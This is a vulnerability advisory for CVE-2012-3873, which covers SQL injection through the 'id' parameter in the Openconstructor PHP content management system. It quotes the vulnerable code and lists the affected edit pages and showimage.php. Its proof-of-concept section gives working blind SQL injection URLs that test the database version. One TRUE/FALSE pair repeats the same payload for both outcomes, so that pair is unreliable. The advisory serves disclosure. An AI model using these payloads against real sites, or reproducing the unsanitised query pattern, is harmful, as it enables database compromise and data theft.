###Description###:
Openconstructor (formerly known as eSector Solutions Web Constructor) is an open source web Content Management System written in PHP.
Multiple SQL injection vulnerabilities exist on the &#039;id&#039; parameter, which is used across different sections of the application.
 
###CVE###
CVE-2012-3873
 
 
###Impact###:
Authenticated attackers can execute arbitrary SQL queries.
 
CVSS Base Score: 9.0 (AV:N/AC:L/Au:S/C:C/I:C/A:C)
 
 
###Credits###:

###Details###:
The following lines of code are the cause of the issue:
 
  ds->get_record($_GET[&#039;id&#039;])
 
get_record() perform a query on the database, without checking the user supplied data in the &#039;id&#039; parameter. The following pages are vulnerable:
 
data/gallery/edit.php
data/guestbook/edit.php
data/file/edit.php
data/htmltext/edit.php
data/publication/edit.php
data/event/edit.php
 
&#039;getimage/showimage.php&#039; is also vulnerable, due to the following lines of code:
 
$res = $db->query(
                &#039;SELECT id, name, filename, size, type, date&#039;.
                &#039; FROM dsfile&#039;.
                &#039; WHERE id=&#039;.$_GET[&#039;id&#039;]
    );
 
 
###Proof of Concept###:
An object (eg:gallery object, file object, guestbook object ...) must first be created or has to already exist in order to exploit the vulnerability.
For instance, if a guestbook object has been created, an attacker can open it in edit page and exploit a blind SQL injection as follows:
 
http://hostname/openconstructor/data/guestbook/edit.php?ds_id=1&id=4 AND 1=1 #returns a TRUE value for the query
http://hostname/openconstructor/data/guestbook/edit.php?ds_id=1&id=4 AND 1=1 #returns a FALSE value for the query
 
In my test environment, I have been able to confirm the possibility to execute queries with the following commands:
 
http://hostname/openconstructor/data/guestbook/edit.php?ds_id=10&id=4 AND (select @@version)=&#039;5.5.16-log&#039; #returns a TRUE value for the query
http://hostname/openconstructor/data/guestbook/edit.php?ds_id=10&id=4 AND (select @@version)=&#039;5.5.16-foo&#039; #returns a FALSE value for the query
 
On &#039;getimage/showimage.php&#039;, an image file must be first successfully uploaded. The exploitation is very similar:
 
http://hostname/openconstructor/getimage/showimage.php?id=1%20AND%20(select%20@@version)=&#039;5.5.16-foo&#039; # returns a FALSE value for the query
http://hostname/openconstructor/getimage/showimage.php?id=1%20AND%20(select%20@@version)=&#039;5.5.16-log&#039; # return a TRUE value for the query
